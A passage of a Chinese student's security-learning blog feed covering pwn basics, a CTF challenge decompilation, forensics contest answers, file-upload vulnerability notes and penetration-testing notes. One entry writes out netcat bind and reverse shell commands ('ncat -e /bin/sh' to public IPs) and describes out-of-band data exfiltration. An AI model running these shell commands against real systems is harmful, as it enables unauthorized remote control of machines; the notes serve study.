dump）命令可以将文件内容转换为八进制形式，并以十六进制和ASCII码方式显示。这可以帮助我们查看目标文件的二进制数据，包括文件头部、节（section）的内容以及其他数据。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711112050940.png" alt="image-20230711112050940"></p><p>把study001.o放到010中分析</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010437475.png" alt="image-20230711010437475"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010621855.png" alt="image-20230711010621855"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711012214621.png" alt="image-20230711012214621"></p><h2 id="四、符号表："><a href="#四、符号表：" class="headerlink" title="四、符号表："></a>四、符号表：</h2><p>1.符号名=函数名+变量名<strong>（函数和变量统称为符号）</strong></p><p>2.符号是整个链接的粘合器，整个链接<strong>基于符号</strong>才能完成</p><p>3.每一个目标文件都有一个符号表</p><p>4.符号值是函数和变量的<strong>地址</strong></p><p>每16个字节代表一个符号</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编译和目标文件结构&quot;&gt;&lt;a href=&quot;#编译和目标文件结构&quot; class=&quot;headerlink&quot; title=&quot;编译和目标文件结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;编译和目标文件结构&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;一、编译&quot;&gt;&lt;a href=&quot;#一、编译</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>pwn004函数</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-exerciser-01.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-exerciser-01.html</id>
    <published>2023-07-10T09:56:00.000Z</published>
    <updated>2023-07-14T13:11:26.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn004"><a href="#pwn004" class="headerlink" title="pwn004"></a>pwn004</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) // 定义一个main函数，它接收三个参数：命令行参数的数量，命令行参数的列表，和环境变量的列表{  char s1[11]; // 定义一个字符数组s1，大小为11  char s2[12]; // 定义一个字符数组s2，大小为12  unsigned __int64 v6; // 定义一个unsigned __int64类型的变量v6  v6 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v6。这通常用于实现堆栈保护  setvbuf(_bss_start, 0LL, 2, 0LL); // 设置_bss_start的缓冲区模式为无缓冲  setvbuf(stdin, 0LL, 2, 0LL); // 设置stdin的缓冲区模式为无缓冲  strcpy(s1, "CTFshowPWN"); // 将字符串"CTFshowPWN"复制到s1中  logo(); // 调用logo函数，这个函数的具体实现没有给出，可能是用来显示一些信息或者图标  puts("find the secret !"); // 输出字符串"find the secret !"  __isoc99_scanf("%s", s2); // 从stdin读取一个字符串，并存储到s2中  if ( !strcmp(s1, s2) ) // 如果s1和s2相同（strcmp的返回值为0），则执行下一行的函数    execve_func(); // 调用execve_func函数，这个函数的具体实现没有给出，可能是执行一些特定的操作  return 0; // main函数返回0，表示程序正常结束}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="execve-func-函数："><a href="#execve-func-函数：" class="headerlink" title="execve_func()函数："></a>execve_func()函数：</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">unsigned __int64 execve_func() // 定义一个返回类型为unsigned __int64的函数execve_func{  char *argv[3]; // 定义一个字符指针数组argv，大小为3。这个数组用来存储execve函数的参数  unsigned __int64 v2; // 定义一个unsigned __int64类型的变量v2  v2 = __readfsqword(0x28u); // 从FS段寄存器的偏移量0x28处读取一个64位的值，并赋值给v2。这通常用于实现堆栈保护  argv[0] = "/bin/sh"; // 将argv数组的第一个元素设为"/bin/sh"，这是要执行的程序的路径  argv[1] = 0LL; // 将argv数组的第二个元素设为0，表示参数列表结束  argv[2] = 0LL; // 将argv数组的第三个元素设为0，表示参数列表结束  execve("/bin/sh", argv, 0LL); // 调用execve函数，执行"/bin/sh"程序。argv是参数列表，0LL表示环境变量列表为空  return __readfsqword(0x28u) ^ v2; // 从FS段寄存器的偏移量0x28处再次读取一个64位的值，并与v2进行异或操作。如果结果为0，表示在函数执行过程中，堆栈没有被破坏}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数的主要逻辑是执行一个新的程序（bin/sh），并检查在执行过程中堆栈是否被破坏。如果堆栈被破坏，函数返回的值将不为0</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn004&quot;&gt;&lt;a href=&quot;#pwn004&quot; class=&quot;headerlink&quot; title=&quot;pwn004&quot;&gt;&lt;/a&gt;pwn004&lt;/h1&gt;&lt;h2 id=&quot;main函数&quot;&gt;&lt;a href=&quot;#main函数&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门刷题" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>计算机基础</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study01.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study01.html</id>
    <published>2023-07-09T16:00:45.000Z</published>
    <updated>2023-07-13T06:46:17.836Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a><strong>计算机基础</strong></h1><h2 id="一、操作系统"><a href="#一、操作系统" class="headerlink" title="一、操作系统"></a>一、操作系统</h2><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-1.jpg" alt="001-1" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-2.jpg" alt="001-2" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-3.jpg" alt="001-3" style="zoom:50%;"><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-4.jpg" alt="001-4" style="zoom: 50%;"><h3 id="1、程序运行只在乎和编辑虚拟地址"><a href="#1、程序运行只在乎和编辑虚拟地址" class="headerlink" title="1、程序运行只在乎和编辑虚拟地址"></a>1、程序运行只在乎和编辑虚拟地址</h3><p>虚拟地址是由CPU和操作系统共同提供的一种内存管理技术。在现代计算机系统中，<strong>每个运行的程序都认为自己独占了所有的内存</strong>，<strong>这些内存地址就是虚拟地址</strong>。实际上，这些虚拟地址是由操作系统通过内存管理单元（MMU）映射到物理内存地址的。</p><h2 id="2、思考"><a href="#2、思考" class="headerlink" title="2、思考:"></a>2、思考:</h2><p> 在一个内存为256M的计算机上:执行程序A(需要内存10M),程序A连续计算并输出所得的质数。同时执行程序B(需要内存5M)，B程序从a.txt读入130MB数据，从b.xt读入50MB数据,数据合并后,存入c.txt. CPU是加何运作的? </p><ol><li><h3 id="程序加载："><a href="#程序加载：" class="headerlink" title="程序加载："></a><strong>程序加载</strong>：</h3><p>首先，操作系统会将程序A和程序B加载到内存中。由于程序A需要10MB内存，程序B需要5MB内存，总共需要15MB内存，这在256MB的内存中是完全可以容纳的。</p></li><li><h3 id="CPU调度："><a href="#CPU调度：" class="headerlink" title="CPU调度："></a><strong>CPU调度</strong>：</h3><p>操作系统会使用一种叫做进程调度的技术，将CPU的时间分配给程序A和程序B。例如，它可能先让程序A运行一段时间，然后再让程序B运行一段时间，如此反复，使得两个程序看起来像是在同时运行。</p></li><li><h3 id="虚拟内存和磁盘I-x2F-O："><a href="#虚拟内存和磁盘I-x2F-O：" class="headerlink" title="虚拟内存和磁盘I/O："></a><strong>虚拟内存和磁盘I/O</strong>：</h3><p>对于程序B，它需要读取的数据总量（130MB + 50MB）超过了物理内存的大小（256MB）。在这种情况下，操作系统会使用一种叫做虚拟内存的技术，将部分数据暂时存储在硬盘上，然后在需要的时候将这些数据加载到内存中。这种技术叫做页面交换（Page Swapping）或者换页（Paging）。同时，操作系统会使用缓冲技术，将读取和写入的数据暂时存储在内存中，然后在合适的时候再进行实际的磁盘I/O操作。</p></li><li><h3 id="数据合并和存储："><a href="#数据合并和存储：" class="headerlink" title="数据合并和存储："></a><strong>数据合并和存储</strong>：</h3><p>程序B在读取完所有数据并进行合并后，会将结果写入c.txt文件。这个过程可能会涉及到磁盘I/O操作，操作系统会负责管理这些操作。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CPU和操作系统会共同工作，通过进程调度、虚拟内存、磁盘I/O等技术，使得程序A和程序B可以在有限的内存和CPU资源中同时运行，并完成各自的任务。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;计算机基础&quot;&gt;&lt;a href=&quot;#计算机基础&quot; class=&quot;headerlink&quot; title=&quot;计算机基础&quot;&gt;&lt;/a&gt;&lt;strong&gt;计算机基础&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;一、操作系统&quot;&gt;&lt;a href=&quot;#一、操作系统&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>电子取证红包赛</title>
    <link href="https://poison-biao.github.io/du-yu/cppu-electronic-forensics-01.html"/>
    <id>https://poison-biao.github.io/du-yu/cppu-electronic-forensics-01.html</id>
    <published>2023-07-06T13:06:00.000Z</published>
    <updated>2023-07-08T10:31:08.376Z</updated>
    
    <content type="html"><![CDATA[<p>每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~</p><p>1、cd082d248033cd557b42b5faa0de5b9f</p><p>(MD5: cd082d248033cd557b42b5faa0de5b9f<br>SHA1: b4b1c4145c599e7d232c3611317ed076495dafb9<br>SHA256: 78295b0b7a71c7dd7555cb2db923de6f78f5338a6aae9150a34fecd535487360<br>CRC32: b7ee2645)</p><p>2、6.1</p><p>3、2020-09-23 14:24:54</p><p>4、A</p><p>5、192.168.152.128</p><p>6、(UTC+08:00)</p><p>7、 ceabb038fdc3e2e55c1e78ad0a2e5fb9</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160238449.png" alt="image-20230702160238449" style="zoom:25%;"><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702160401497.png" alt="image-20230702160401497" style="zoom:25%;"><p>8、6191e971cfdf5296ee7df7c2fed56377</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702162304311.png" alt="image-20230702162304311"></p><p>9、HackBar V2   、    Proxy SwitchyOmega</p><p>（差点被LZJ骗了，这个就是对的）</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702154910574.png" alt="image-20230702154910574" style="zoom:25%;"><p>10、7.2.</p><img src="C:\Users\asus\Pictures\Screenshots\Snipaste_2023-07-02_15-41-43.png" alt="Snipaste_2023-07-02_15-41-43" style="zoom:25%;"><p>11、192.168.152.150</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702180300769.png" alt="image-20230702180300769" style="zoom:25%;"><p>12、00-0C-29-0F-B9-F7</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702163500129.png" alt="image-20230702163500129" style="zoom:25%;"><p>13、CaiXX-PC</p><p>14、pico2020</p><p>15、105,906,176</p><p>16、A</p><p>17、B</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702182224126.png" alt="image-20230702182224126" style="zoom:25%;"><p>18、12753</p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193248514.png" alt="image-20230702193248514" style="zoom:25%;"><p>19、 8f8319bc3c1b8ed92aa5498dd98c8e87e5f888f7<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193115519.png" alt="image-20230702193115519" style="zoom:25%;"></p><p>20、Administrator   、    Guest 、  chaunchaun</p><p>22、shuandan</p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702193916532.png" alt="image-20230702193916532"></p><p>23、<a href="http://www.tpshop.com.tar.gz/">www.tpshop.com.tar.gz</a></p><p>24、120ac49800671dc383b6f3709c25c099</p><p>两都是一样，所以是同一个webshell<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195054106.png" alt="image-20230702195054106"></p><p>25、 tpshop / s13132312s<img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230702195519596.png" alt="image-20230702195519596" style="zoom:25%;"></p><p>27、26</p><p>31、9176</p><p>37、101</p><p>（一个一个数）</p><p>38、B</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;每日吐槽：蛙趣啊！~   该说不说，取证大师真的很强，但是也确实搞心态啊，取证三次，电脑崩掉2次，天选三太废物了啊~&lt;/p&gt;
&lt;p&gt;1、cd082d248033cd557b42b5faa0de5b9f&lt;/p&gt;
&lt;p&gt;(MD5: cd082d248033cd557b42b5f</summary>
      
    
    
    
    <category term="电子取证" scheme="https://poison-biao.github.io/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="取证校赛" scheme="https://poison-biao.github.io/tags/%E5%8F%96%E8%AF%81%E6%A0%A1%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>050文件上传漏洞</title>
    <link href="https://poison-biao.github.io/du-yu/vulnerability-learning-02.html"/>
    <id>https://poison-biao.github.io/du-yu/vulnerability-learning-02.html</id>
    <published>2023-07-05T08:27:16.000Z</published>
    <updated>2023-07-06T13:39:58.915Z</updated>
    
    <content type="html"><![CDATA[<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>上传图片—–&gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）</p><p>显示图片—–&gt;解码数据还原，如果不是图片则不显示</p><p>（可能有特殊符号各种什么的，转化为数据进行完整封装）</p><p>解析协议固定</p><p>不管是什么文件类型</p><p>解析为指定数据类型</p><p>数据存储文件，固定的协议解析文件</p><p>不管上传什么文件，只认数据</p><h3 id="大网站分站存储"><a href="#大网站分站存储" class="headerlink" title="大网站分站存储"></a>大网站分站存储</h3><p>保护域名——————–&gt;控制解析</p><p>想测试ZZ</p><p>OSS存储</p><p>如何判断：<strong>1.看上传之后的访问地址，如果后门无法解析就</strong></p><p><strong>2.看上传的数据包（bilibili）</strong></p><p><strong>3.分站上传看访问地址</strong></p><p><strong>4.一打开就是下载</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/Vulnerability-learning.png" alt="Vulnerability-learning"></p><h1 id="绕过（除了下面这种其他无解）"><a href="#绕过（除了下面这种其他无解）" class="headerlink" title="绕过（除了下面这种其他无解）"></a>绕过（除了下面这种其他无解）</h1><p>文件被锁</p><p>能控制上传文件写入目录</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>上传以后就被杀掉了</p><h1 id="SDK阿里云"><a href="#SDK阿里云" class="headerlink" title="SDK阿里云"></a>SDK阿里云</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;p&gt;上传图片—–&amp;gt;base64数据（文件上传变为数据形式 ，方便存储在数据库中）&lt;/p&gt;
&lt;p&gt;显示图片—</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-漏洞学习" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>049挖洞思路</title>
    <link href="https://poison-biao.github.io/du-yu/vulnerability-learning-01.html"/>
    <id>https://poison-biao.github.io/du-yu/vulnerability-learning-01.html</id>
    <published>2023-07-05T08:27:01.000Z</published>
    <updated>2023-07-06T13:39:48.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP中间件"><a href="#PHP中间件" class="headerlink" title="PHP中间件"></a>PHP中间件</h2><p>形成：网上找的中间件</p><h3 id="编译器漏洞"><a href="#编译器漏洞" class="headerlink" title="编译器漏洞"></a>编译器漏洞</h3><p>编译器（文件上传文件解析）</p><p>形成原因：代码逻辑存在安全问题（可能是从网上找的代码）</p><p>扫描目录，看ue版本，利用漏洞</p><h2 id="CMS源码"><a href="#CMS源码" class="headerlink" title="CMS源码"></a>CMS源码</h2><p>知道网站程序</p><p>已知漏洞，直接放到漏洞检测工具 </p><h2 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h2><p>对目标一无所知</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>审计自己写的和抄袭的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP中间件&quot;&gt;&lt;a href=&quot;#PHP中间件&quot; class=&quot;headerlink&quot; title=&quot;PHP中间件&quot;&gt;&lt;/a&gt;PHP中间件&lt;/h2&gt;&lt;p&gt;形成：网上找的中间件&lt;/p&gt;
&lt;h3 id=&quot;编译器漏洞&quot;&gt;&lt;a href=&quot;#编译器漏洞&quot; class=&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-漏洞学习" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>06抓包技术&amp;HTTPS协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB&amp;转发联动</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-06.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-06.html</id>
    <published>2023-07-03T16:00:06.000Z</published>
    <updated>2023-07-06T13:40:12.723Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web协议的抓包"><a href="#web协议的抓包" class="headerlink" title="web协议的抓包"></a>web协议的抓包</h3><p>工具：charles（茶杯）  Telerik Fiddler</p><p>BP设置代理的原理：感觉像充当一个VPN，让浏览器走监听的端口，BP监听或者拦截</p><p><strong>本机</strong>：证书——&gt;抓包</p><p><strong>模拟器</strong>：证书—–&gt;设置代理——&gt;抓包（封装和没封装的APP都能抓到）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-07%20085010.png" alt="屏幕截图 2023-06-07 085010"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;web协议的抓包&quot;&gt;&lt;a href=&quot;#web协议的抓包&quot; class=&quot;headerlink&quot; title=&quot;web协议的抓包&quot;&gt;&lt;/a&gt;web协议的抓包&lt;/h3&gt;&lt;p&gt;工具：charles（茶杯）  Telerik Fiddler&lt;/p&gt;
&lt;p&gt;BP设置代理的</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>05基础命令&amp;反弹shell&amp;数据不回显带外查询</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-05.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-05.html</id>
    <published>2023-07-03T16:00:05.000Z</published>
    <updated>2023-07-06T13:40:05.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、常规基本渗透命令详解"><a href="#一、常规基本渗透命令详解" class="headerlink" title="一、常规基本渗透命令详解"></a>一、常规基本渗透命令详解</h2><p>(<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a>)</p><h4 id="实用案例1：文件上传下载-解决无图形化-amp-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-amp-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h4><p> 解决问题：不能正常在目标靶机下载后门，将文件上传到web服务器，在目标靶机用棱角社区生成的命令下载到目标靶机上</p><p>棱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><h2 id="二、反弹S-hell命令-解决数据回显-amp-解决数据通讯"><a href="#二、反弹S-hell命令-解决数据回显-amp-解决数据通讯" class="headerlink" title="二、反弹S hell命令-解决数据回显&amp;解决数据通讯"></a>二、反弹S hell命令-解决数据回显&amp;解决数据通讯</h2><p>常规的shell连接，攻击者的系统会连接到受害者的系统。但在反弹shell中，情况正好相反，是受害者的系统连接到攻击者的系统。好处：可以绕过防火墙和其他安全措施，因为大多数防火墙都是配置为阻止入站连接，而不是出站连接。</p><p>前提：需要攻击者能够在受害者的系统上<strong>执行代码</strong>，这通常需要利用某种漏洞，或者通过社会工程学的手段诱骗受害者执行恶意代码。此外，一旦建立了反弹shell，攻击者需要保持其系统在线，并监听来自受害者系统的连接。如果攻击者的系统离线，或者不再监听，那么反弹shell就会失效。</p><p>命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p><strong>实例</strong>：</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606173654309.png" alt="image-20230606173654309"></p><h2 id="三、正反向代理"><a href="#三、正反向代理" class="headerlink" title="三、正反向代理"></a>三、正反向代理</h2><h4 id="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"><a href="#原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接" class="headerlink" title="原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接"></a>原理：正向代理就是目标靶机将自己的IP绑定一个端口，我们的本机主动去连接；反向代理就是本机IP绑定一个端口，目标靶机主动连接</h4><p>1、正向连接：本地监听等待对方连接</p><p>Linux控制Windows</p><p>//绑定CMD到本地5566端口</p><p>nc -e cmd -lvp 5566</p><p>//主动连接目标5566</p><p>ncat 47.122.23.131 5566</p><p>Windows控制Linux</p><p>//绑定SH到本地5566端口</p><p>ncat -e /bin/sh -lvp 5566</p><p>//主动连接目标5566</p><p>nc 47.94.236.117 5566</p><p>2、反向连接：主动给出去，对方监听</p><p>//绑定CMD到目标5566端口</p><p>ncat -e /bin/sh 47.122.23.131 5566</p><p>//等待5566连接</p><p>nc -lvvp 5566</p><p>//绑定CMD到目标5566端口</p><p>nc -e cmd 47.94.236.117 5566</p><p>//等待5566连接</p><p>ncat -lvvp 5566</p><h2 id="四、内网服务器"><a href="#四、内网服务器" class="headerlink" title="四、内网服务器"></a>四、内网服务器</h2><p>只有内网IP主动出去找主机IP（唯一）才行</p><p>在内网的路由器上设置一个<strong>端口转发</strong>（端口隐私），可以和内网的目标IP交互 </p><p><strong>两边都是内网</strong>，需要一个中间人</p><h2 id="五、数据回显-查询带外-amp-网络协议层级"><a href="#五、数据回显-查询带外-amp-网络协议层级" class="headerlink" title="五、数据回显-查询带外&amp;网络协议层级"></a>五、数据回显-查询带外&amp;网络协议层级</h2><p><strong>实例：</strong>防火墙组合数据不回显-ICMP带外查询Dnslog</p><p>漏洞有，数据无法回显：（原因：回显源代码被注释掉了或者直接没有）</p><p>解决：1.反弹shell </p><p>​          2.带外查询</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606184614766.png" alt="image-20230606184614766"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185106252.png" alt="image-20230606185106252"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606185235140.png" alt="image-20230606185235140"></p><h2 id="带外查询："><a href="#带外查询：" class="headerlink" title="带外查询："></a>带外查询：</h2><p>演示中防火墙都开着，ping命令能绕过防火墙（大部分时候），<code>ping</code>命令使用的是ICMP协议（Internet Control Message Protocol），防火墙过滤的是TCP和UDP协议，比ICMP协议低一级</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606202146536.png" alt="image-20230606202146536"></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606225717092.png" alt="image-20230606225717092"></h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230606230834445.png" alt="image-20230606230834445"></p><h2 id="六、防火墙出入站设置"><a href="#六、防火墙出入站设置" class="headerlink" title="六、防火墙出入站设置"></a>六、防火墙出入站设置</h2><p>入站设置：检查入站流量，只能<strong>反向连接</strong>，主动给出</p><p>出站设置：检查出站流量，<strong>正向连接</strong>（但是入站也会默认开启较严格的设置）</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p> <img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230607084906805.png" alt="image-20230607084906805"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、常规基本渗透命令详解&quot;&gt;&lt;a href=&quot;#一、常规基本渗透命令详解&quot; class=&quot;headerlink&quot; title=&quot;一、常规基本渗透命令详解&quot;&gt;&lt;/a&gt;一、常规基本渗透命令详解&lt;/h2&gt;&lt;p&gt;(&lt;a href=&quot;https://blog.csdn.ne</summary>
      
    
    
    
    <category term="渗透" scheme="https://poison-biao.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透-信息收集" scheme="https://poison-biao.github.io/tags/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>04APP架构-封装&amp;原生态&amp;H5&amp;flutter</title>
    <link href="https://poison-biao.github.io/du-yu/information-collection-04.html"/>
    <id>https://poison-biao.github.io/du-yu/information-collection-04.html</id>
    <published>2023-07-03T16:00:04.000Z</published>
    <updated>2023-07-06T13:39:54.235Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APP应用开发架构"><a href="#APP应用开发架构" class="headerlink" title="APP应用开发架构"></a>APP应用开发架构</h2><h3 id="1、原生开发"><a href="#1、原生开发" class="headerlink" title="1、原生开发"></a>1、原生开发</h3><p>安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</p><p>APP-开发架构-原生态-IDEA</p><h4 id="安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）"><a href="#安全影响：反编译-amp-抓包-amp-常规测试（提取资产信息：1-接口：IP地址、网站域名）" class="headerlink" title="安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）"></a>安全影响：反编译&amp;抓包&amp;常规测试（提取资产信息：1.接口：IP地址、网站域名）</h4><h4 id="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"><a href="#安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包" class="headerlink" title="安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包"></a>安全测试：逆向的角度去分析逻辑设计安全；简单安卓逆向，常见抓包</h4><h3 id="2、使用H5语言开发（前端语言）"><a href="#2、使用H5语言开发（前端语言）" class="headerlink" title="2、使用H5语言开发（前端语言）"></a>2、使用H5语言开发（前端语言）</h3><p>使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</p><h4 id="APP-开发架构-H5-amp-Vue-HBuilderX"><a href="#APP-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h4><p>演示：HBuilderX案例</p><p>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</p><h4 id="WX小程序-开发架构-H5-amp-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-amp-Vue-HBuilderX" class="headerlink" 